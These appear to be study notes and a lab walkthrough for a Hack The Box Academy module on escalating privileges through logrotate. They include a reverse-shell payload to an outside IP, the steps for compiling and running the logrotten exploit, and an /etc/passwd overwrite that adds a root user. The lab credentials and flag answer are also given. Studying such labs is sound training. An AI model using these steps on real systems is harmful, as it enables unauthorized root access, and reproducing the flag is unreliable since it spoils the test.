# Logrotate
To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs.

`Logrotate` has many features for managing these log files. These include the specification of:

- the `size` of the log file,
- its `age`,
- and the `action` to be taken when one of these factors is reached.

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```sh
$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```sh
$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

- we need `write` permissions on the log files
- logrotate must run as a privileged user or `root`
- vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. 

```sh
$ git clone https://github.com/whotwagner/logrotten.git
$ cd logrotten
$ gcc logrotten.c -o logrotten
$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

However, before running the exploit, we need to determine which option logrotate uses in `logrotate.conf`.

```sh
$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.

```sh
$ ./logrotten -p ./payload /tmp/tmp.log
```

## Questions
SSH to 10.129.204.41 (ACADEMY-LLPE-LOG), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{l0G_r0t7t73N_00ps}**
   - Logrotate running vulnerable version:
        ```sh
        $ logrotate -v
        logrotate 3.11.0 - Copyright (C) 1995-2001 Red Hat, Inc.
        This may be freely redistributed under the terms of the GNU Public License
        ```
   - Clone logrotten locally, then transfer `logrotten.c` to the target:
   - To promote ourself to `root`, we can overwrite `/etc/passwd` with our own, appending a new root user:
        ```sh
        # create a new passwd file
        $ cp /etc/passwd /tmp/passwd
        $ openssl passwd -1 Password1
        $1$t4leQWAm$i1aPn4j80y06UyR4oDVQP/
        $ echo 'attacker:$1$t4leQWAm$i1aPn4j80y06UyR4oDVQP/:0:0:attacker:/root:/bin/bash' >> /tmp/passwd
        # add the overwrite command to our payload
        $ echo 'if [ `id -u` -eq 0 ]; then (cp /tmp/passwd /etc/passwd &); fi' > payload
        ```
   - We know that logrotten is watching the `/home/kali/backups/access.log` base on the output of this command:
        ```sh
        $ cat /var/lib/logrotate.status
        logrotate state -- version 2
        "/home/htb-student/backups/access.log" 2026-6-22-15:44:0
        ```
   - Therefore, run the exploit on this log file:
        ```sh
        $ gcc logrotten.c -o logrotten
        $ ./logrotten -p payload /home/htb-student/backups/access.log
        Waiting for rotating /home/htb-student/backups/access.log...
        Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
        Waiting 1 seconds before writing payload...
        Done!
        ```
   - Wait for `/etc/passwd` to be changed (~5s), then log in as our new user and read the flag:
        ```sh
        $ tail -n1 /etc/passwd
        attacker:$1$t4leQWAm$i1aPn4j80y06UyR4oDVQP/:0:0:attacker:/root:/bin/bash
        $ su attacker
        Password: Password1
        # cat /root/flag.txt
        HTB{l0G_r0t7t73N_00ps}
        ```